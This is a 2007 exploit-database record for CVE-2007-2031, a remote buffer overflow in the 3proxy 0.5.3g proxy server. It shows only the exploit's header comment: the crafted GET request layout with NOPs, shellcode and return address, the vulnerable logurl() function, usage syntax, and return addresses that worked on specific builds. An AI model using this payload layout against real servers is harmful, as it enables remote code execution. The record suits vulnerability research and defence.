{
    "text": "ecve : CVE-2007-2031 ， title : 3proxy 0.5.3g ( Linux ) - 'proxy.c logurl (  ) ' Remote Buffer Overflow - Linux remote Exploit ， verified : Verified ， exploit_detail : / *  [ 3proxy [ v0.5.3g ]  :  ( linux ) remote buffer overflow exploit. ]  ，  *  *  ，  * by : vade79/v9 v9 @ fakehalo.us ( fakehalo/realhalo )  *  ，  *  *  ，  * compile :  *  ，  * gcc x3proxy.c -o x3proxy *  ，  *  *  ，  * syntax :  *  ，  * ./x3proxy [ -pscr+ ] -h host *  ，  *  *  ，  * sumus homepage/url :  *  ，  *  *  ，  *  *  ，  * 3Proxy tiny free proxy server previously known as 3 [ APA3A ]  *  ，  * tiny freeware proxy. *  ，  *  *  ，  * I just saw a ( gentoo ) advisory , and got curious how easy *  ，  * it would be to exploit this. The vulnerability is fairly *  ，  * trival :  *  ，  *  *  ，  * ----------------------------------------------------------- *  ，  * GET / [ NOPS ]  [ SHELLCODE ]  [ RETADDR ] \\n *  ，  * Host :  [ FILLER ] \\n\\n *  ，  * ----------------------------------------------------------- *  ，  *  *  ，  * The length of \"Host :  [ FILLER ] \" is exactly how many bytes *  ，  * past the buffer boundary it will go , if it's not there it *  ，  * won't overflow. The vulnerability can be found in proxy.c *  ，  * in the logurl (  ) function. ( buf [ LINESIZE ]  )  *  ，  *  *  ，  * I didn't work out a common place to find the shellcode in *  ，  * memory. but , the following values ( -r option ) worked for *  ，  * me :  *  ，  * 0x0805333c ( gentoo/r2 0.5.3g src compile )  *  ，  * 0x08054da8 ( mandrake 0.5.3g src compile )  *  ，  *  *  ，  * It will probably be easiest to run through a debugger and *  ，  * find where the address of the shellcode is. ( offsets of *  ，  * around 1500 when brute guessing )  * ",
    "time": "2007-04-30"
}